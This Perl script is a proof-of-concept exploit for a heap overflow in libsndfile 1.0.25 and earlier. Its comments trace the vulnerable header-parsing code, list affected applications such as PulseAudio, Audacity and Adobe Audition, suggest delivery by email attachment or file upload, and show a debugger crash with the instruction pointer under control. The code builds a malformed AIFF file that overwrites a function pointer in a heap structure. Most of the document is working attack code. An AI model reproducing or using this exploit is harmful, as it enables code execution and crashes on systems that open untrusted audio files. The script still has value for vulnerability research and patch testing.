#!/usr/bin/env perl
#
# Exploit Title: libsndfile <= 1.0.25 (latest version) Heap overflow
# Date: 07 Oct 2015
# Exploit Author: Marco Romano @nemux_
# Vendor Homepage: http://www.mega-nerd.com/libsndfile/
# Version: <= 1.0.25
# Tested on: Ubuntu 15.04 / OS X El Capitan 10.11
#
####################################################################
#
# Author: Marco Romano (@nemux_) - 07 Oct 2015
#
# PoC for libsndfile <= 1.0.25 (latest version) Heap overflow
# 
# run ./poc.pl to make nemux.aiff file. Now it can be delivered in different ways. 
#
# Possible attack vectors: 
# - Firefox (on Linux) -> SWF/Audio play -> pulseaudio -> libsndfile ?? (not tested)
# - Email attachment 
# - TCP socket connection (for audio server only)
# - File upload (ex. server side audio file manipulation, interactive voice responder)
# - etc...
# -----------------------------------------------------------------------------------------
# [*] Affected products: -- All products using libsndfile (a non-exhaustive list below)
#
# [-] PusleAudio             - http://www.freedesktop.org/wiki/Software/PulseAudio/ (TESTED)
#        Installed by default on most linux environments with libsndfile too (Ex.: Ubuntu, Debian)   
# [-] Jack AudioConnectionKit- http://www.jackaudio.org                             (TESTED)
#        Available for Linux, Win, OSX (List of applications http://www.jackaudio.org/applications/)
# [-] Adobe Audition         - http://www.adobe.com/products/audition.html          (TESTED) 
# [-] Audacity               - http://www.audacityteam.org/                         (TESTED)
# [-] Asterisk-eSpeak Module - https://zaf.github.io/Asterisk-eSpeak/               (NOT TESTED)
# 
# run an "apt-cache rdepends libsndfile1" to see other interesting dependencies
# searching around i found that library is widely used on IOS and Android projects too
# ------------------------------------------------------------------------------------------
# [*] libsndfile web site references
#
# [-] http://www.mega-nerd.com/libsndfile/
# [-] https://github.com/erikd/libsndfile.git
# [-] https://en.wikipedia.org/wiki/Libsndfile 
#
# Note: (wikipedia reports that LAME encoder depends by libsndfile too 
#        but i didn't find this dependecy...)
########################################################################################
#### Vulnerability is based on the wrong management of the headindex and headend values. 
#### While parsing a specially crafted AIFF header the attacker can manage index values
#### in order to use memcpy(...) to overwrite memory heap. 
########################################################################################   
####
# Some parts of the source code:
#
# -- common.c:337 [*]
#   ...
# #define SF_STR_BUFFER_LEN               (8192)
# #define SF_HEADER_LEN                   (4100 + SF_STR_BUFFER_LEN)
#   ...
# typedef struct sf_private_tag
# {
#       ...
#   ...
#        /* Index variables for maintaining logbuffer and header above. */
#   ...
#        int                             headindex, headend ;
#   ...
#       /* Virtual I/O functions. */
#        int                                     virtual_io ;
#        SF_VIRTUAL_IO           vio ;
#   ...
#   ...
# } SF_PRIVATE;
# 
# Take a look to the source of aiff.c: 
# -- git clone https://github.com/erikd/libsndfile.git
#
# src/aiff.c:403 
# while (!done) { ... }
# -->
# src/common.c:
# int psf_binheader_readf (SF_PRIVATE *psf, char const *format, ...) { } 
# --> -->  
# src/common.c:793
# static int header_read (SF_PRIVATE *psf, void *ptr, int bytes)
# --> --> -->
# src/common.c:
#  static int header_read(...) {
#   ...
#    memcpy (ptr, psf->header + psf->headindex, bytes) ;
#    psf->headindex += bytes ;
#
# } /* header_read */
#  
# Thourgh a specially crafted AIFF header we can
# 1- increase and decrease the headindex value regardless what should be its real value   
# 2- Overwriting memory with arbitrary data...
#
### Pulseudio test on x86_64
#
# Starting program: /usr/bin/paplay nemux.aiff
# [Thread debugging using libthread_db enabled]
# Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
# Program received signal SIGSEGV, Segmentation fault.
# [----------------------------------registers-----------------------------------]
# RAX: 0x41414141 ('AAAA')
# RBX: 0x60d3e0 --> 0x0 
# RCX: 0x610a80 --> 0x0 
# RDX: 0x44444444 ('DDDD')
# RSI: 0x1 
# RDI: 0x7ea 
# RBP: 0x36b0 
# RSP: 0x7fffffffd958 --> 0x7ffff76cfe71 (pop    rbx)
# RIP: 0x41414141 ('AAAA')
# ...
# [-------------------------------------code-------------------------------------]
# Invalid $PC address: 0x41414141
# [------------------------------------------------------------------------------]
# Legend: code, data, rodata, value
# Stopped reason: SIGSEGV
# 0x0000000041414141 in ?? ()
#########
##########################################################################################
 
my $header_aiff_c = "\x46\x4F\x52\x4D" . ### FORM and VERSION
    "\x00\x00\xD0\x7C" .
    "\x41\x49\x46\x43" .
    "\x42\x56\x45\x52" . 
    "\x00\x00\x00\x04" .
    "\xA2\x80\x51\x40" .
    "\x43\x4F\x4D\x4D" . ### COMM Chunk and Compression NONE (PCM) 
    "\x00\x00\x00\x11" .
    "\x00\x01\x00\x00" .
    "\x00\x00\x00\x10" .
    "\xF3\x0C\xFA\x00" .
    "\x00\x00\x00\x00" .
    "\x00\x00\x4E\x4F" .
    "\x4E\x45\x0E\x6E" .
    "\x6F\x74\x20\x63" .
    "\x63\x6D\x92\x72" .
    "\x65\x73\x53\x65\x64\x00" .
    "\x53\x53\x4E\x44" . ### 2 SSND Chunks
    "\x00\x00\x00\x40" .
    "\x00\x00\x00\xAA" .
    "\xBD\xBD\xC5\x58" .
    "\xBD\x96\xCA\xB0" .
    "\xE9\x6F\x0A\xFE" .
    "\x24\xCD\x26\x65" .
    "\x73\x73\x65\x64" . 
    "\x00\x53\x53\x4E" .
    "\x44\x00\x00\x00" .
    "\x40\x00\x00\x00" . 
    "\x00\xF8\x72\xF3" . 
    "\x59\xFB\x56\xFE" . 
    "\x00\x00\x00\x3E" . 
    "\xE9\x22\x66\x94" .
    "\x4E\x66\x55\x94" .
    "\x4E\xD4\xD7\xC5" .
    "\x42\x49\x61\xC4" .
    "\x43\x4F\x4D\x54" . ### 2 COMT Chunks
    "\x00\x00\x00\x26" . 
    "\x00\x01\x00\x20" . 
    "\x68\x17\x0C\x10" . 
    "\x25\x03\x00\x10" . ### 0x2503 items 
    "\x03\x80\xFF\x37" . 
    "\x52\x00\x00\x00" . 
    "\x04\xA2\x8E\x51" . 
    "\x40\x43\x4F\x4D" .
    "\x54\x00\x00\x0B" .
    "\x26\x00\x01\x00" .
    "\x20\x68" . 
    "\x17\x00\x10\x03" . ### Start wrong and junk chunks (they will trigger default block in the switch statement in aiff.c)  
    "\x03\x00\x10\x1B" . 
    "\x80\xFF\xFF\x4F" .
    "\x4E\x45\x1F\x6E" . ### my debug: heap 0x161e0d8
    "\x6F\x00\x01\x00" . ### my debug: heap 0x161e0dc
    "\x00\xE4\x7F\x72" . ### ...
    "\x00\x00\x00\xD7" . 
    "\xBA\x17\xFF\xE3" . 
    "\x1F\x40\xFF\x20" . 
    "\x18\x08\xDD\x18" . 
    "\x00\x28\x00\x28" .
    "\x00\x28\x40\x28" . 
    "\x00\x28\x00\x28" .
    "\x00\x28\xFF\xFF" . 
    "\xFF\x80\xF7\x17" . 
    "\x00\x18\x01\x00" .
    "\x20\x68\x17\x0C" . 
    "\x10\x03\x03\x00" . 
    "\x10\x03\x80\xFF" . 
    "\xFF\x4F\x4E\x45" . 
    "\x0A\x6E\x70\x00" . 
    "\x18\xDE\x3A\x08" .
    "\x00\x18\x21\xA6" . 
    "\x05\x7F\x40\x00" . 
    "\x08\xFF\x5D\x00" . 
    "\xF0\x00\x4F\x00" . 
    "\x6A\xFF\x89\x9D" . 
    "\xDA\x07\xB6\xFF" . 
    "\x2C\x92\xB3\x0D" . 
    "\xE4\x40\xBB\x23" . 
    "\x00\x18\x00\x38" . 
    "\x00\x63\x00\x28" . 
    "\x00\x90\xFF\xFF" . 
    "\x20\x18\x08\xDD" . 
    "\x18\x00\x28\x00" . 
    "\x28\x00\x5E\xFC" . 
    "\x78\xD9\xAD\xCD" . 
    "\x9E\x3E\xE9\x21" . 
    "\x55\x94\x4E\x85" . 
    "\x51\x94\x4E\xA6" . 
    "\xD7\xC5\x42\xA7" . 
    "\x2A\x55\xC4\x9F" . 
    "\x43\x4F\x4D\x54" . ### here start next COMT Chunk with 0x36B0 items 
    "\x08\x00\x00\x26" . 
    "\x00\x01\x00\x20" . 
    "\x68\x17\x0C\xDD" . 
    "\x36\xB0"; #### end of header... 
 
my $file= "nemux.aiff";
 
if ($ARGV[0] eq "h" || $ARGV[0] eq "help") {
     print "\n[*] POC for libsndfile <= 1.0.25 (latest version)\n"; 
     print "[*] Heap overflow vulnerability\n";
     print "[*] Author: Marco Romano (\@nemux_) - 07 Oct 2015 \n";
     print "\n Just run " . $0 . " (output will be \"nemux.aiff\" file)\n\n";
     exit 0;
}
 
my $eax_addr = 0x41414141;
my $edx_addr = 0x44444444;
 
#####
#### We are going to overwirte psf structure allocated in the heap
#####
 
my $content_file = pack('Q', $eax_addr);
$content_file   .= "\x90" x ( 21146 - length pack('Q',$eax_addr) );
 
##### 
### In the psf structure we will overwrite "int virtual_io" with a true value, and vio.seek function pointer 
### with an arbitrary address. 
### in this way the block below will be triggred in file_io.c:
### ...
### if (psf->virtual_io)
### return psf->vio.seek (...);
### 
##### 
my $rax_overwrite    = pack('Q',$eax_addr);        ### overwrite vio.seek pointer here
my $padding          = "\x43" x 24;                ### ....
my $rdx_overwrite    = pack('Q',$edx_addr);        ### overwrite rdx here ... 
my $padding_end_file = "MOMIMANHACKERNOW" x 7;     ### not useful but funny... -_-
 
print "\n[*] Making AIFF file: \"nemux.aiff\"";
my $payload = $header_aiff_c . $content_file . $rax_overwrite . $padding . $rdx_overwrite . $padding_end_file;
print "\n[*] Done... AIFF File Size: ".length($payload)."\n";
print "\nIs it over? ... Hello? ... Did we win? (cit.)\n";
 
open($FILE,">$file");
print $FILE $payload;
close($FILE);
 
print "\n[+] You can test it on OSX and Linux with Audacity  - linux command line /usr/bin/audacity namux.aiff\n";
print "[+] You can test it on OSX Windows and Linux        - with Adobe Audition";
print "\nNote: Adobe Audition will trigger the bug just when it scans the directory that contains this aiff file\n\n"; 
print "Marco Romano \@nemux_\n\n";
